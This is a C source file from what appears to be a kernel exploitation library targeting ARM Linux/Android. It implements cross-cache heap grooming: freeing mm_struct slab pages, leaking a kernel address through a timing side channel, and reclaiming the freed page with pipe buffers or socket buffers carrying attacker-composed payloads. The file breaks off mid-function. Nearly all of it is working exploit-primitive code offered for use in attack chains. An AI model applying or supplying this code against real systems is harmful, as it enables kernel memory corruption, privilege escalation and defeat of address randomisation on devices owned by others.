/* lib/spray/crosscache/crosscache.c -- see crosscache.h.
 *
 * The order of operations is the technique. Objects are allocated so a page
 * belongs to them alone; the side channel gives one object's address, and the
 * page is the address with its low bits cleared. Freeing that page puts it at
 * the head of this processor's free list, where the very next allocation of a
 * suitable size takes it -- and that next allocation has to be the caller's,
 * which is why nothing runs in between.
 *
 * The receiving cache is prepared beforehand: its partial pages are drained, so
 * the allocation that follows the free cannot be satisfied from a page the
 * allocator already had, and has to take a fresh one.
 */
#define _GNU_SOURCE
#include "crosscache.h"

#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

/* kernelsnitch.h defaults to __INTEL (x86 identity-map range) unless __ARM is
 * defined before its first include in THIS translation unit -- each TU that
 * includes it needs its own definition. Without it the bruteforce searches
 * 0xffff888000000000-0xffffc88000000000 (x86) instead of this device's real
 * 0xffffff8000000000+ linear map, and the leak cannot find a real address. */
#ifndef __ARM
#define __ARM 1
#endif
#include "../../leak/kernelsnitch/kernelsnitch.h"   /* the timing side channel */
#include "../../addr/physmap.h"                      /* lib_is_direct_ptr (leak sanity) */

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

struct cc_ctx { size_t cnt; pid_t *childs; int *memfds; };

/* ---- module state ---- */
static struct crosscache_cfg cc_cfg;
static struct kernelsnitch_shared_state *cc_ks;
static struct cc_ctx cc_prep, cc_spray, cc_pre, cc_post;
static pid_t cc_leak_child;
static int cc_leak_memfd = -1;
static int (*cc_n)[2], (*cc_c)[2], (*cc_e)[2], (*cc_drain)[2], (*cc_reclaim)[2];
static size_t cc_n_cnt, cc_c_cnt, cc_e_cnt, cc_drain_cnt, cc_reclaim_cnt;
static uintptr_t cc_base;
static pid_t cc_pipe_bare_child = -1;   /* parked, holding the reclaimed pipes -- see cc_place_pipe_bare */

/* ---- primitives ---- */
/* Pin to the processor whose per-cpu page list the sequence depends on.
 *
 * Which list a freed page lands on, and which list the refill allocates from,
 * is decided by the processor each runs on -- so this is load-bearing, not
 * housekeeping. A caller already confined to a different set (by an outer
 * affinity mask) silently keeps running elsewhere, which changes the result
 * without changing the code, so a refusal is reported once. */
static void cc_pin(int core)
{
	static int complained;
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(core, &set);
	if (syscall(__NR_sched_setaffinity, 0, sizeof(set), &set) && !complained) {
		complained = 1;
		pr_error("crosscache: cannot pin to cpu %d (outer affinity mask?) -- "
			 "the sequence is running on whatever it was already allowed\n", core);
	}
}
static void cc_yield4(void){ sched_yield(); sched_yield(); sched_yield(); sched_yield(); }

static pid_t cc_clone_child(void)
{
	pid_t c = (pid_t)syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
	if (c == 0) { prctl(PR_SET_PDEATHSIG, SIGKILL); if (getppid()==1) _exit(0);
		cc_pin(cc_cfg.core); for(;;) pause(); }
	return c;
}
static int cc_clone_memfd(void)
{
	pid_t c = cc_clone_child();
	char p[64]; snprintf(p, sizeof p, "/proc/%d/mem", c);
	int fd = open(p, O_RDONLY);
	if (c > 0) { kill(c, SIGKILL); waitpid(c, NULL, 0); }
	return fd;
}
/* This child's own mm_struct is what the whole sequence resolves and then
 * frees -- the free happens synchronously, in this process's own context, at
 * the `_exit(0)` below (do_exit -> exit_mm -> mmput -> the actual
 * kmem_cache_free), on whichever CPU the scheduler had this process running
 * on at that moment. Every decoy child (cc_clone_child) pins itself, and this
 * one pins for the same reason: the free and the refill, which IS pinned
 * (cc_pin(cc_cfg.core) runs again right before every reclaim), must agree on
 * which per-CPU free list the page ends up on, or a free that lands on a
 * different CPU than the one the refill asks from is not a free the refill
 * can win.
 *
 * Same-CPU free-and-refill is table stakes that published cross-cache
 * techniques (CROSS-X, PCP-massaging, SLUBStick) all assume rather than
 * contribute; none of their distinctive machinery is reproduced here. */
/* CC_LEAK_PIN=0 disables the pin below, for measuring what it changes on its
 * own rather than assuming it. Read once per call rather than cached: this
 * runs a handful of times per groom, not on a path where a getenv() costs
 * anything that matters. */
static int cc_leak_pin_enabled(void)
{
	const char *e = getenv("CC_LEAK_PIN");
	return !e || strcmp(e, "0");
}
static pid_t cc_clone_leak_child(void)
{
	int pin_it = cc_leak_pin_enabled();
	pid_t c = (pid_t)syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
	if (c == 0) { if (pin_it) cc_pin(cc_cfg.core); kernelsnitch_find_collisions(cc_ks); _exit(0); }
	return c;
}
static int cc_init_ctx(struct cc_ctx *x, size_t n){ x->cnt=n; x->childs=calloc(n,sizeof(pid_t)); x->memfds=calloc(n,sizeof(int)); return (x->childs&&x->memfds)?0:-1; }
static void cc_fill(struct cc_ctx *x){ for(size_t i=0;i<x->cnt;i++){ x->childs[i]=-1; x->memfds[i]=cc_clone_memfd(); } }

/* pipe object helpers (F_SETPIPE_SZ resizes the pipe_buffer array) */
static void cc_resize(int fd[2], size_t slots){ fcntl(fd[0], F_SETPIPE_SZ, slots*PAGE_SIZE); }
static void cc_make(int fd[2]){ if(pipe(fd)==0) cc_resize(fd, 2); else { fd[0]=fd[1]=-1; } }
static void cc_alloc(int fd[2]){ cc_resize(fd, cc_cfg.pipe_slots); }
static void cc_free(int fd[2]){ cc_resize(fd, 2); }

static int (*cc_make_pipes(size_t n))[2]
{
	int (*a)[2] = calloc(n, sizeof(*a));
	if (!a) return NULL;
	for (size_t i=0;i<n;i++) cc_make(a[i]);
	return a;
}

/* Drain the receiving cache: fill several of its pages, then free one so the
 * strided subset to leave the kmalloc-pipe cache partial in a known shape. */
static void cc_shape_once(void)
{
	size_t ops = cc_cfg.pipe_objs_per_slab;
	for (size_t i=0;i<cc_n_cnt;i++) cc_alloc(cc_n[i]);
	for (size_t i=0;i<cc_c_cnt;i++) cc_alloc(cc_c[i]);
	for (size_t i=0;i<cc_e_cnt;i++) cc_alloc(cc_e[i]);
	for (size_t i=0;i<cc_n_cnt;i+=ops) cc_free(cc_n[i]);
	for (size_t i=0;i<cc_e_cnt;i++) cc_free(cc_e[i]);
	for (size_t i=0;i<cc_c_cnt;i+=ops) cc_free(cc_c[i]);
}

/* The refill has to ask the page allocator for a block of the SAME order the
 * groom freed, or it cannot be handed that block at all.
 *
 * A socket buffer big enough to need page frags is built by alloc_skb_with_frags:
 * a linear kmalloc buffer for the head, then frags taken at the largest order it
 * is allowed for which the pages still outstanding cover a whole block. So the
 * order reached is decided by how many pages remain AFTER the head, and a
 * message that leaves fewer than 1<<order of them never requests that order,
 * whatever its total size.
 *
 * This is why the sockets below are datagram, not stream. unix_stream_sendmsg
 * clamps every buffer it builds to SKB_MAX_HEAD(0) + SKB_MAX_ORDER(0, 2), which
 * leaves at most four pages of frags -- so a stream send can never request more
 * than an order-2 block, and against an order-3 groom it can only ever be handed
 * the page by accident, when the allocator happens to split the block for it.
 * unix_dgram_sendmsg carries no such clamp and is allowed up to
 * PAGE_ALLOC_COSTLY_ORDER.
 *
 * Twice the order size clears the frag-count threshold with room to spare. It is
 * also a whole number of pages, which keeps the frag's first byte on the
 * replication stride, so the reclaimed block starts with a complete copy of the
 * payload rather than the middle of one. */
static size_t cc_order_size;   /* PAGE_SIZE << cfg.mm_order, set by the groom */

/* CC_FRAG_BYTES overrides this for a bench A/B. order_size*2 does not send a
 * single order-matched fragment: for order 3, `unix_stream_sendmsg`'s own
 * chunking (net/unix/af_unix.c, net/core/skbuff.c) sends order-1 and order-2
 * allocations alongside the order-3 one. Whether that improves landing by
 * pushing the order-3 request through the zone-locked buddy path, rather
 * than an occasional per-CPU-cache hit that never reaches the free area, is
 * measured in crosscache/README.md rather than assumed here. */
static size_t cc_frag_len(size_t order_size)
{
	const char *override = getenv("CC_FRAG_BYTES");

	if (override) {
		size_t v = (size_t)strtoul(override, NULL, 0);

		if (v)
			return v;
	}
	return order_size * 2;
}

/* A datagram socketpair whose send buffer can hold several of those messages,
 * so a spray of them queues instead of blocking on the first. */
static int cc_pair(int sv[2])
{
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) return -1;
	int want = (int)(cc_frag_len(cc_order_size ? cc_order_size : 0x8000) * 8);
	setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &want, sizeof want);
	setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, &want, sizeof want);
	return 0;
}

/* Where in a message of `len` bytes the page frags begin.
 *
 * The payload is replicated across the message, but only the frags are pages --
 * the head is a kmalloc buffer, not the block the groom freed. A copy therefore
 * has to begin exactly where the frags do, or the reclaimed block starts in the
 * middle of one and every offset inside it is wrong by a constant no consumer
 * knows. unix_dgram_sendmsg puts everything past SKB_MAX_ALLOC into
 * page-aligned frags, so they begin at len - PAGE_ALIGN(len - SKB_MAX_ALLOC). */
#define CC_SKB_MAX_ALLOC 16064u   /* SKB_WITH_OVERHEAD(PAGE_SIZE << 2), 4K pages */

static size_t cc_frag_off(size_t len)
{
	size_t data_len = len > CC_SKB_MAX_ALLOC ? len - CC_SKB_MAX_ALLOC : 0;
	data_len = (data_len + PAGE_SIZE - 1) & ~((size_t)PAGE_SIZE - 1);
	return len > data_len ? len - data_len : 0;
}

/* Build the bytes of one reclaim message: `fill` repeated, phased so a whole
 * copy starts at the first frag page. Separate from the send because the buffer
 * has to exist BEFORE the victim is freed -- allocating one between the free and
 * the send is an allocation in the window the technique is trying to keep
 * empty. */
static unsigned char *cc_compose_msg(size_t skb_send, const void *fill, size_t fill_len)
{
	unsigned char *b = malloc(skb_send);
	if (!b) return NULL;
	if (!fill || !fill_len) { memset(b, CROSSCACHE_FILLER_BYTE, skb_send); return b; }
	size_t frag = cc_frag_off(skb_send) % fill_len;
	for (size_t o = 0; o < skb_send; ) {
		size_t within = ((o + fill_len) - frag) % fill_len;
		size_t n = fill_len - within;
		if (n > skb_send - o) n = skb_send - o;
		memcpy(b + o, (const unsigned char *)fill + within, n);
		o += n;
	}
	return b;
}

/* Send one already-composed message. Allocates nothing. */
static int cc_send_buf(int sv[2], const unsigned char *b, size_t skb_send)
{
	if (sv[0] < 0 || !b) return -1;
	struct iovec io = { .iov_base=(void *)b, .iov_len=skb_send };
	struct msghdr m; memset(&m,0,sizeof m); m.msg_iov=&io; m.msg_iovlen=1;
	ssize_t n = sendmsg(sv[0], &m, 0);
	if (n < 0) pr_error("crosscache: send of %zu bytes failed: %s\n", skb_send, strerror(errno));
	return n<0 ? -1 : 0;
}

/* one AF_UNIX send of skb_send bytes over an already-created socketpair;
 * if `fill`/`fill_len` given, replicate it across the buffer (else filler). */
static int cc_send(int sv[2], size_t skb_send, const void *fill, size_t fill_len)
{
	unsigned char *b = cc_compose_msg(skb_send, fill, fill_len);
	if (!b) return -1;
	int rc = cc_send_buf(sv, b, skb_send);
	free(b);
	return rc;
}

/* module-held leak sk_buff: created+sent in crosscache_leak_base (holds base),
 * freed by the chosen reclaim (pipe_reclaim / content_reclaim). */
static int cc_skb_sv[2] = {-1,-1};
static int (*cc_content_sv)[2]; static size_t cc_content_n;

/* Groom and free: allocate the objects, leak one address, free the page
 * page and reclaim it with the module socket buffer so the side channel can
 * leak that page's address. Returns base with cc_skb_sv STILL HOLDING it and the
 * core pinned; the caller's reclaim frees cc_skb_sv and retakes base. When
 * When pipes are requested, every pool is created up front
 * (before any free) for a following crosscache_pipe_reclaim(). */
/* Read the address out of the side channel and reduce it to the page.
 *
 * A mis-leak is the dangerous failure: a value of the right shape that names
 * the wrong page sends every later step somewhere arbitrary. Anything that is
 * not an order-aligned linear-map pointer is rejected here so the caller grooms
 * again instead of building on it. Returns 0 on failure. */
static uintptr_t cc_leaked_object;

static uintptr_t cc_resolve_leak(size_t order_size)
{
	uintptr_t leaked;

	kernelsnitch_bruteforce(cc_ks);
	kernelsnitch_release_threads(cc_ks);
	leaked = (uintptr_t)kernelsnitch_cleanup(cc_ks);
	cc_ks = NULL;
	if (leaked == (uintptr_t)-1 || leaked == 0) {
		pr_error("crosscache: page leak failed\n");
		return 0;
	}
	if (!lib_is_direct_ptr(leaked)) {
		pr_error("crosscache: leaked %#lx not a linear-map ptr (mis-leak) -- rejected\n",
			 (unsigned long)leaked);
		return 0;
	}
	cc_leaked_object = leaked;
	cc_base = leaked & ~((uintptr_t)order_size - 1);
	pr_info("crosscache: leaked=%#lx base=%#lx\n", (unsigned long)leaked,
		(unsigned long)cc_base);
	return cc_base;
}

/* The part every method shares: arrange the object cache so one page is ours
 * alone, park the side channel on it, and free everything that is not it.
 *
 * What follows this point is where the methods disagree -- when the address is
 * taken, and how many times the page changes hands -- so it is deliberately the
 * seam. Returns 0 on success. */
static int cc_groom_prologue(const struct crosscache_cfg *cfg, int with_pipes)
{
	cc_cfg = *cfg;
	cc_order_size = (size_t)PAGE_SIZE << cc_cfg.mm_order;
	size_t order_size = cc_order_size;
	size_t ops = order_size / cc_cfg.mm_struct_sz;           /* mm objs/slab (32) */
	size_t pops = cc_cfg.pipe_objs_per_slab;                  /* pipe objs/slab (16) */
	int cpus = (int)sysconf(_SC_NPROCESSORS_ONLN);

	if (with_pipes) {
		/* pipe-cache shaping pools made 2-slot up front (before any free) so
		 * their fd/inode allocs don't perturb the target page. */
		size_t partial_groups = (cc_cfg.pipe_min_partial + cc_cfg.pipe_cpu_partial - 1) / cc_cfg.pipe_cpu_partial;
		cc_n_cnt = partial_groups * cc_cfg.pipe_cpu_partial * pops;
		cc_c_cnt = cc_cfg.pipe_cpu_partial * pops;
		cc_e_cnt = 2 * pops;
		cc_drain_cnt = pops * cc_cfg.pipe_drain_slabs;
		cc_reclaim_cnt = pops * cc_cfg.pipe_reclaim_slabs;
		cc_n = cc_make_pipes(cc_n_cnt); cc_c = cc_make_pipes(cc_c_cnt); cc_e = cc_make_pipes(cc_e_cnt);
		cc_drain = cc_make_pipes(cc_drain_cnt); cc_reclaim = cc_make_pipes(cc_reclaim_cnt);
		if (!cc_n||!cc_c||!cc_e||!cc_drain||!cc_reclaim) { pr_error("crosscache: pipe alloc failed\n"); return -1; }
	}

	if (cc_init_ctx(&cc_prep, 32*ops) || cc_init_ctx(&cc_spray, (1+cc_cfg.mm_partials)*ops) ||
	    cc_init_ctx(&cc_pre, ops-1) || cc_init_ctx(&cc_post, ops)) { pr_error("crosscache: ctx alloc failed\n"); return -1; }

	cc_fill(&cc_prep);
	cc_fill(&cc_spray);
	cc_ks = kernelsnitch_setup(cc_cfg.mm_struct_sz, cc_cfg.mm_order, cpus, cc_cfg.leak_collisions, 0, 0);
	if (!cc_ks) { pr_error("crosscache: kernelsnitch_setup failed\n"); return -1; }
	cc_fill(&cc_pre);
	cc_leak_child = cc_clone_leak_child();
	cc_fill(&cc_post);
	{ char p[64]; snprintf(p,sizeof p,"/proc/%d/mem",cc_leak_child); cc_leak_memfd = open(p,O_RDONLY); }

	for (size_t i=0;i<cc_pre.cnt;i++)  if(cc_pre.childs[i]>0){ kill(cc_pre.childs[i],SIGKILL); waitpid(cc_pre.childs[i],NULL,0);}
	for (size_t i=0;i<cc_post.cnt;i++) if(cc_post.childs[i]>0){ kill(cc_post.childs[i],SIGKILL); waitpid(cc_post.childs[i],NULL,0);}
	for (size_t i=0;i<cc_spray.cnt;i++)if(cc_spray.childs[i]>0){ kill(cc_spray.childs[i],SIGKILL);waitpid(cc_spray.childs[i],NULL,0);}
	if (cc_leak_child>0) waitpid(cc_leak_child,NULL,0);

	if (!kernelsnitch_found_collisions(cc_ks)) { pr_error("crosscache: collision finding failed\n"); return -1; }
	return 0;
}

/* Reclaim-then-leak.
 *
 * The page is taken with filler bytes first and the address read afterwards,
 * which means the page must change hands a second time before it can carry a
 * payload that names it. Two exchanges instead of one, and the second is the
 * one that has to land. */
static uintptr_t cc_groom(const struct crosscache_cfg *cfg, int with_pipes)
{
	size_t order_size, ops;

	if (cc_groom_prologue(cfg, with_pipes))
		return 0;
	order_size = cc_order_size;
	ops = order_size / cc_cfg.mm_struct_sz;
	(void)ops;

	/* SKB leak: create both socketpairs BEFORE the frees, pcp-shape, free the mm
	 * slab pages, free the leak child's mm, reclaim it with an sk_buff, then
	 * The side channel leaks that page's address; the buffer keeps holding it. */
	int pcp_sv[2]={-1,-1};
	/* The shaping send stays a stream send: its job is to move the receiving
	 * cache into a known state before any free, and the sequence is tuned for
	 * the allocations a stream send makes. The HOLDING buffer is different --
	 * see below. */
	if (socketpair(AF_UNIX,SOCK_STREAM,0,pcp_sv)<0 || cc_pair(cc_skb_sv)<0) { pr_error("crosscache: socketpair failed\n"); return 0; }
	cc_send(pcp_sv, order_size*2, NULL, 0);
	cc_pin(cc_cfg.core);
	cc_yield4();
	/* Each close here frees one address space and is part of the sequence, so
	 * the order matters. Clearing the slot is what lets cleanup close the ones
	 * this sequence does not, without double-closing the ones it does. */
	for (size_t i=0;i<cc_pre.cnt;i++)  if(cc_pre.memfds[i]>0) { close(cc_pre.memfds[i]); cc_pre.memfds[i]=-1; }
	for (size_t i=0;i+1<cc_post.cnt;i++) if(cc_post.memfds[i]>0) { close(cc_post.memfds[i]); cc_post.memfds[i]=-1; }
	for (size_t i=0;i<cc_spray.cnt;i+=ops) if(cc_spray.memfds[i]>0) { close(cc_spray.memfds[i]); cc_spray.memfds[i]=-1; }
	close(pcp_sv[0]); close(pcp_sv[1]);
	cc_yield4();
	if (cc_leak_memfd>0){ close(cc_leak_memfd); cc_leak_memfd=-1; }
	/* This is the buffer that is supposed to HOLD the freed block until the
	 * address has been read, and it can only hold it if it asks the allocator
	 * for a block of the same order -- so it is order-matched (cc_frag_len over
	 * a datagram socket), unlike the shaping send above.
	 *
	 * What sits between this and the reclaim is not a pause: cc_resolve_leak
	 * runs the side channel's brute force, which is thousands of threads and a
	 * scan of the whole linear map. A block left on a per-processor free list
	 * across that does not survive it. Holding it is the difference between a
	 * placement and a lottery. */
	cc_send(cc_skb_sv, cc_frag_len(order_size), NULL, 0);

	if (!cc_resolve_leak(order_size))
		return 0;
	cc_pin(cc_cfg.core);
	return cc_base;
}

uintptr_t crosscache_leak_base(const struct crosscache_cfg *cfg) { return cc_groom(cfg, 0); }

/* cc_groom's own body, with the hold socket handed to the caller instead of
 * kept in cc_skb_sv, and a connection-oriented socket in place of cc_pair's
 * datagram -- everything else (the shaping pools, the close-loop bounds, the
 * pcp-shaping send, the pinning and yields) is the exact sequence cc_groom
 * already runs, because that sequence is not what differs between the two
 * sockets. Only the hold step is.
 *
 * `with_pipes` is passed straight through to cc_groom_prologue: a caller that
 * also wants the pipe-cache pools (cc_n/c/e/drain/reclaim) built asks for them
 * here, at groom time, the same as cc_groom(cfg, 1) does for the datagram
 * hold. crosscache_leak_base_stream() below is this with with_pipes fixed
 * at 0. */
static uintptr_t cc_leak_base_stream(const struct crosscache_cfg *cfg, int held_sv[2],
                                     int with_pipes)
{
	size_t order_size, ops;
	int pcp_sv[2] = { -1, -1 };

	held_sv[0] = held_sv[1] = -1;
	if (cc_groom_prologue(cfg, with_pipes))
		return 0;
	order_size = cc_order_size;
	ops = order_size / cc_cfg.mm_struct_sz;

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, held_sv) < 0) {
		pr_error("crosscache: stream hold socketpair failed\n");
		return 0;
	}
	if (socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv) < 0) {
		pr_error("crosscache: socketpair failed\n");
		close(held_sv[0]); close(held_sv[1]); held_sv[0] = held_sv[1] = -1;
		return 0;
	}
	cc_send(pcp_sv, order_size * 2, NULL, 0);
	cc_pin(cc_cfg.core);
	cc_yield4();
	for (size_t i=0;i<cc_pre.cnt;i++)  if(cc_pre.memfds[i]>0) { close(cc_pre.memfds[i]); cc_pre.memfds[i]=-1; }
	for (size_t i=0;i+1<cc_post.cnt;i++) if(cc_post.memfds[i]>0) { close(cc_post.memfds[i]); cc_post.memfds[i]=-1; }
	for (size_t i=0;i<cc_spray.cnt;i+=ops) if(cc_spray.memfds[i]>0) { close(cc_spray.memfds[i]); cc_spray.memfds[i]=-1; }
	close(pcp_sv[0]); close(pcp_sv[1]);
	cc_yield4();
	if (cc_leak_memfd>0){ close(cc_leak_memfd); cc_leak_memfd=-1; }
	/* Hold with filler over the caller's socket, exactly as cc_groom holds
	 * over cc_skb_sv -- send(NULL,0) fills with CROSSCACHE_FILLER_BYTE. */
	cc_send(held_sv, order_size * 2, NULL, 0);

	if (!cc_resolve_leak(order_size)) {
		close(held_sv[0]); close(held_sv[1]); held_sv[0] = held_sv[1] = -1;
		return 0;
	}
	cc_pin(cc_cfg.core);
	return cc_base;
}

uintptr_t crosscache_leak_base_stream(const struct crosscache_cfg *cfg, int held_sv[2])
{
	return cc_leak_base_stream(cfg, held_sv, 0);
}

int crosscache_pipe_reclaim(void)
{
	if (!cc_base || !cc_reclaim) return -1;
	/* The order that matters: prepare the receiving cache, pre-create the drain
	 * pipes, FREE the leak sk_buff (base -> freelist), then alloc reclaim pipes
	 * so one pipe_buffer array lands on base. */
	cc_shape_once();
	for (size_t i=0;i<cc_drain_cnt;i++) cc_alloc(cc_drain[i]);
	cc_pin(cc_cfg.core);
	if (cc_skb_sv[0]>=0){ close(cc_skb_sv[0]); cc_skb_sv[0]=-1; }
	if (cc_skb_sv[1]>=0){ close(cc_skb_sv[1]); cc_skb_sv[1]=-1; }
	for (size_t i=0;i<cc_reclaim_cnt;i++) cc_alloc(cc_reclaim[i]);
	pr_info("crosscache: pipe reclaim done (%zu pipes)\n", cc_reclaim_cnt);
	return 0;
}

uintptr_t crosscache_pipe_base(const struct crosscache_cfg *cfg)
{
	uintptr_t b = cc_groom(cfg, 1);
	if (!b) return 0;
	if (crosscache_pipe_reclaim()) return 0;
	return b;
}

/* Content reclaim: release the buffer holding the page and retake it with a
 * sk_buff carrying `tmpl` (self-referential to base). Content-controlled, so
 * base ends holding the caller's forge bytes. Returns 0/-1. */
int crosscache_content_reclaim(const void *tmpl, size_t len, size_t nspray)
{
	if (!cc_base || len == 0 || len > cc_order_size) return -1;
	if (nspray == 0) nspray = 1;
	/* Pre-create all reclaim socketpairs BEFORE freeing base (socket alloc
	 * perturbs the freelist). Then free base and fire nspray order-N sends: one
	 * retakes the just-freed order-N page (base); the rest land elsewhere and are
	 * harmless (same self-referential forge). More sends -> higher land rate. */
	int (*sv)[2] = calloc(nspray, sizeof(*sv));
	if (!sv) return -1;
	for (size_t i=0;i<nspray;i++) { sv[i][0]=sv[i][1]=-1;
		if (cc_pair(sv[i]) < 0) { pr_error("crosscache: content socketpair failed\n"); free(sv); return -1; } }
	/* Compose BEFORE the page is surrendered: anything allocated between the
	 * free and the sends can take the block instead of them. */
	size_t msg_len = cc_frag_len(cc_order_size);
	unsigned char *msg = cc_compose_msg(msg_len, tmpl, len);
	if (!msg) { free(sv); return -1; }
	cc_pin(cc_cfg.core);
	if (cc_skb_sv[0]>=0){ close(cc_skb_sv[0]); cc_skb_sv[0]=-1; }
	if (cc_skb_sv[1]>=0){ close(cc_skb_sv[1]); cc_skb_sv[1]=-1; }
	/* No yield here. The block is on this processor's free list and the next
	 * allocation of its order takes it; handing the processor to anything else
	 * first is handing it the block. */
	for (size_t i=0;i<nspray;i++) cc_send_buf(sv[i], msg, msg_len);
	free(msg);
	/* keep the sends held so base stays occupied; hand back the first pair via
	 * cc_skb_sv and stash the rest (freed at cleanup). */
	cc_skb_sv[0]=sv[0][0]; cc_skb_sv[1]=sv[0][1];
	cc_content_sv = sv; cc_content_n = nspray;
	pr_info("crosscache: content reclaim (%zu bytes x%zu) at base=%#lx\n", len, nspray, (unsigned long)cc_base);
	return 0;
}

void crosscache_reclaim_pipes(int (**fds)[2], size_t *n){ *fds = cc_reclaim; *n = cc_reclaim_cnt; }

/* ---------------------------------------------------------------- methods ---
 *
 * Both take a page the caller owns and refill it from another cache. They
 * disagree on one thing: whether the address is read before or after the page
 * changes hands. Everything else follows from that.
 */

/* Leak-then-take.
 *
 * The address is read while the object is still alive, so the payload can be
 * composed before the page is ever given up and the page changes hands exactly
 * once -- the single exchange is also the one that must land. */
static uintptr_t cc_place_direct(const struct crosscache_request *r)
{
	size_t order_size, ops;
	unsigned char *payload = NULL;
	int pcp_sv[2] = { -1, -1 };
	int (*sv)[2];
	size_t nspray = r->nspray ? r->nspray : 1;

	if (cc_groom_prologue(&r->cfg, 0))
		return 0;
	order_size = cc_order_size;
	ops = order_size / cc_cfg.mm_struct_sz;

	/* Read it now, while the object whose page this is still exists. */
	if (!cc_resolve_leak(order_size))
		return 0;
	/* The victim is still allocated at this point, so a caller that can read
	 * kernel memory can confirm the address names a live object before any of
	 * it is given up. No later moment can show this. */
	if (r->inspect)
		r->inspect(CROSSCACHE_STAGE_LEAKED, cc_leaked_object, cc_base, r->user);

	if (r->compose) {
		payload = malloc(r->send_bytes);
		if (!payload)
			return 0;
		memset(payload, 0, r->send_bytes);
		r->compose(payload, r->send_bytes, cc_base, r->user);
	}

	/* Every allocation the sequence needs is made before the first free, so
	 * that allocating does not disturb the freelist the frees are shaping. */
	sv = calloc(nspray, sizeof(*sv));
	if (!sv) { free(payload); return 0; }
	for (size_t i = 0; i < nspray; i++) {
		sv[i][0] = sv[i][1] = -1;
		if (cc_pair(sv[i]) < 0) {
			pr_error("crosscache: refill socketpair failed\n");
			free(sv); free(payload); return 0;
		}
	}
	if (socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv) < 0) {
		pr_error("crosscache: socketpair failed\n");
		free(sv); free(payload); return 0;
	}
	size_t msg_len = cc_frag_len(order_size);
	unsigned char *msg = cc_compose_msg(msg_len, payload, payload ? r->send_bytes : 0);
	if (!msg) { free(sv); free(payload); return 0; }
	cc_send(pcp_sv, order_size * 2, NULL, 0);
	cc_pin(cc_cfg.core);
	cc_yield4();
	for (size_t i=0;i<cc_pre.cnt;i++)  if(cc_pre.memfds[i]>0) { close(cc_pre.memfds[i]); cc_pre.memfds[i]=-1; }
	for (size_t i=0;i+1<cc_post.cnt;i++) if(cc_post.memfds[i]>0) { close(cc_post.memfds[i]); cc_post.memfds[i]=-1; }
	for (size_t i=0;i<cc_spray.cnt;i+=ops) if(cc_spray.memfds[i]>0) { close(cc_spray.memfds[i]); cc_spray.memfds[i]=-1; }
	close(pcp_sv[0]); close(pcp_sv[1]);
	cc_yield4();
	/* The page is surrendered here, and retaken by the sends below. */
	if (cc_leak_memfd>0){ close(cc_leak_memfd); cc_leak_memfd=-1; }
	for (size_t i = 0; i < nspray; i++)
		cc_send_buf(sv[i], msg, msg_len);
	free(msg);

	cc_skb_sv[0]=sv[0][0]; cc_skb_sv[1]=sv[0][1];
	cc_content_sv = sv; cc_content_n = nspray;
	free(payload);
	pr_info("crosscache: direct place x%zu at base=%#lx\n", nspray, (unsigned long)cc_base);
	return cc_base;
}

/* Take-then-leak: the page is held with filler while the address is read, then
 * exchanged a second time for a payload that can name it. */
static uintptr_t cc_place_swap(const struct crosscache_request *r)
{
	unsigned char *payload = NULL;
	uintptr_t base = cc_groom(&r->cfg, 0);
	int rc;

	if (!base)
		return 0;
	/* The page is held by filler here and by nothing else, which is the only
	 * moment at which the address can be checked independently of whether the
	 * payload later lands. */
	if (r->inspect)
		r->inspect(CROSSCACHE_STAGE_HELD, cc_leaked_object, base, r->user);
	if (r->compose) {
		payload = malloc(r->send_bytes);
		if (!payload)
			return 0;
		memset(payload, 0, r->send_bytes);
		r->compose(payload, r->send_bytes, base, r->user);
	}
	rc = crosscache_content_reclaim(payload, r->send_bytes, r->nspray ? r->nspray : 1);
	free(payload);
	return rc ? 0 : base;
}

/* Leak-then-take, refilled over a connection instead of a datagram.
 *
 * Identical to `direct` up to the refill -- same prologue, same early read,
 * same single exchange. The refill itself asks the allocator through a
 * stream socket's own send path instead of a datagram's, because the two do
 * not shape the receiving cache the same way, and a caller migrating from a
 * hand-written stream-based reclaim has already measured which one its own
 * allocation needs.
 *
 * The caller owns the whole message: composed once, at the size it asks for,
 * with no replication or phase-alignment applied on its way out. A caller
 * whose object needs several identical copies inside that one buffer builds
 * them itself, the same way it builds every other field -- this method never
 * reinterprets what `compose` hands it. */
/* CC_STREAM_MULTI (env, on by default; "0" opts out): `nspray` independent
 * stream sockets, one send to each, in place of one socket sent to `nspray`
 * times in a row. Isolates the socket-count variable from `direct`'s
 * datagram-vs-stream choice by keeping the same protocol and send size.
 * Landing rate against this reclaim is dominated by allocator compaction
 * state (crosscache/README.md, "Where the difficulty is"); against that
 * baseline, independent sockets measure a modest, consistent edge over the
 * single-socket form. `CC_STREAM_MULTI=0` reaches the single-socket form for
 * comparison. Bench-only knob; nothing that calls this method for a real
 * chain sets it either way. */
static int cc_stream_multi_enabled(void)
{
	const char *v = getenv("CC_STREAM_MULTI");

	return !v || strcmp(v, "0") != 0;
}

static uintptr_t cc_place_stream(const struct crosscache_request *r)
{
	size_t order_size, ops;
	unsigned char *payload = NULL;
	int pcp_sv[2] = { -1, -1 };
	int sv[2] = { -1, -1 };
	int (*msv)[2] = NULL;
	int multi = cc_stream_multi_enabled();
	size_t nspray = r->nspray ? r->nspray : 1;

	if (cc_groom_prologue(&r->cfg, 0))
		return 0;
	order_size = cc_order_size;
	ops = order_size / cc_cfg.mm_struct_sz;

	/* Read it now, while the object whose page this is still exists. */
	if (!cc_resolve_leak(order_size))
		return 0;
	if (r->inspect)
		r->inspect(CROSSCACHE_STAGE_LEAKED, cc_leaked_object, cc_base, r->user);

	if (r->compose) {
		payload = malloc(r->send_bytes);
		if (!payload)
			return 0;
		memset(payload, 0, r->send_bytes);
		r->compose(payload, r->send_bytes, cc_base, r->user);
	}

	/* Every allocation the sequence needs is made before the first free, so
	 * that allocating does not disturb the freelist the frees are shaping. */
	if (multi) {
